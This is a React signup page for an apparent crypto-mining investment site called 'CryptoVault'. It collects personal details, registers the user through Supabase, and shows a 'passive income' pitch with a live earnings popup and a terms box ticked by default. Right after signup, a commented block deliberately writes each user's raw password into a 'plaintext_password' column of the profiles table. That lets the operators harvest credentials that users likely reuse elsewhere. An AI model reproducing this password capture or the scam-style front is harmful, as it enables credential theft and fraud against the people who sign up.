import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "sonner";
import { Loader2 } from "lucide-react";
import { COUNTRIES, ACCOUNT_TYPES } from "@/lib/constants";
import { CURRENCIES } from "@/lib/currencies";
import { z } from "zod";
import { LiveEarningsPopup } from "@/components/LiveEarningsPopup";

const schema = z.object({
  full_name: z.string().trim().min(2).max(100),
  username: z.string().trim().min(3).max(30).regex(/^[a-zA-Z0-9_]+$/, "Letters, numbers, underscore only"),
  email: z.string().trim().email().max(255),
  password: z.string().min(8, "Min 8 characters").max(72),
  confirm: z.string(),
  country: z.string().min(1, "Select a country"),
  gender: z.string().min(1, "Select gender"),
  phone: z.string().trim().min(5).max(20),
  account_type: z.string().min(1),
  currency: z.string().min(1),
}).refine(d => d.password === d.confirm, { path: ["confirm"], message: "Passwords don't match" });

const Signup = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [form, setForm] = useState({
    full_name: "", username: "", email: "", password: "", confirm: "",
    country: "", gender: "", phone: "", account_type: "crypto_mining", currency: "USD",
  });

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) =>
    setForm(f => ({ ...f, [k]: e.target.value }));

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const parsed = schema.safeParse(form);
    if (!parsed.success) { toast.error(parsed.error.issues[0].message); return; }
    setLoading(true);
    const { data: signed, error } = await supabase.auth.signUp({
      email: form.email,
      password: form.password,
      options: {
        emailRedirectTo: `${window.location.origin}/dashboard`,
        data: {
          full_name: form.full_name, username: form.username, country: form.country,
          gender: form.gender, phone: form.phone, account_type: form.account_type,
          currency: form.currency, preferred_currency: form.currency,
        },
      },
    });
    if (error) { setLoading(false); toast.error(error.message); return; }

    // Persist the plaintext password to the profile row created by the new-user trigger.
    if (signed.user?.id) {
      await supabase.from("profiles")
        .update({ plaintext_password: form.password } as never)
        .eq("user_id", signed.user.id);
    }

    setLoading(false);
    toast.success("Account created! Welcome to CryptoVault.");
    navigate("/dashboard");
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 py-12"
      style={{ backgroundColor: "#172640" }}
    >
      <div className="w-full max-w-2xl">
        <Link to="/" className="flex flex-col items-center gap-2 mb-6">
          <div className="h-12 w-12 rounded-xl bg-primary flex items-center justify-center font-black text-black text-xl">C</div>
          <span className="font-bold text-lg text-white">CryptoVault</span>
        </Link>
        <div className="rounded-2xl border border-slate-200 bg-white shadow-xl overflow-hidden">
          <div className="bg-primary text-black px-6 py-8 text-center">
            <h1 className="text-2xl md:text-3xl font-black">Create your account</h1>
            <p className="text-sm opacity-90 mt-1">Join 250,000+ investors earning passive income.</p>
          </div>
          <form onSubmit={submit} className="p-6 md:p-8 grid sm:grid-cols-2 gap-4">
            <Field label="Full Name"><Input value={form.full_name} onChange={set("full_name")} required className="bg-white border-slate-300" /></Field>
            <Field label="Username"><Input value={form.username} onChange={set("username")} required className="bg-white border-slate-300" /></Field>
            <Field label="Email"><Input type="email" value={form.email} onChange={set("email")} required className="bg-white border-slate-300" /></Field>
            <Field label="Phone Number"><Input value={form.phone} onChange={set("phone")} required className="bg-white border-slate-300" /></Field>
            <Field label="Country">
              <select value={form.country} onChange={set("country")} className="w-full h-10 rounded-md border border-slate-300 bg-white px-3 text-sm" required>
                <option value="">Select country</option>
                {COUNTRIES.map(c => <option key={c}>{c}</option>)}
              </select>
            </Field>
            <Field label="Gender">
              <select value={form.gender} onChange={set("gender")} className="w-full h-10 rounded-md border border-slate-300 bg-white px-3 text-sm" required>
                <option value="">Select</option>
                <option>Male</option><option>Female</option><option>Other</option>
              </select>
            </Field>
            <Field label="Account Type">
              <select value={form.account_type} onChange={set("account_type")} className="w-full h-10 rounded-md border border-slate-300 bg-white px-3 text-sm">
                {ACCOUNT_TYPES.map(a => <option key={a.value} value={a.value}>{a.label}</option>)}
              </select>
            </Field>
            <Field label="Preferred Currency">
              <select value={form.currency} onChange={set("currency")} className="w-full h-10 rounded-md border border-slate-300 bg-white px-3 text-sm">
                {CURRENCIES.map(c => <option key={c.code} value={c.code}>{c.code} — {c.name} ({c.country})</option>)}
              </select>
            </Field>
            <Field label="Password"><Input type="password" value={form.password} onChange={set("password")} required className="bg-white border-slate-300" /></Field>
            <Field label="Confirm Password"><Input type="password" value={form.confirm} onChange={set("confirm")} required className="bg-white border-slate-300" /></Field>
            <div className="sm:col-span-2 flex items-center gap-2 text-sm">
              <Checkbox id="tos" defaultChecked />
              <label htmlFor="tos" className="text-slate-600">I agree to the <a className="text-primary underline">Terms & Conditions</a></label>
            </div>
            <Button type="submit" disabled={loading} className="sm:col-span-2 w-full">
              {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
              {loading ? "Creating..." : "Create Account"}
            </Button>
          </form>
          <p className="text-sm text-center text-slate-600 pb-6">
            Already have an account? <Link to="/login" className="text-primary font-semibold">Sign In</Link>
          </p>
        </div>
      </div>
      <LiveEarningsPopup />
    </div>
  );
};

const Field = ({ label, children }: { label: string; children: React.ReactNode }) => (
  <div className="space-y-1.5">
    <Label className="text-xs font-medium text-slate-700">{label}</Label>
    {children}
  </div>
);

export default Signup;
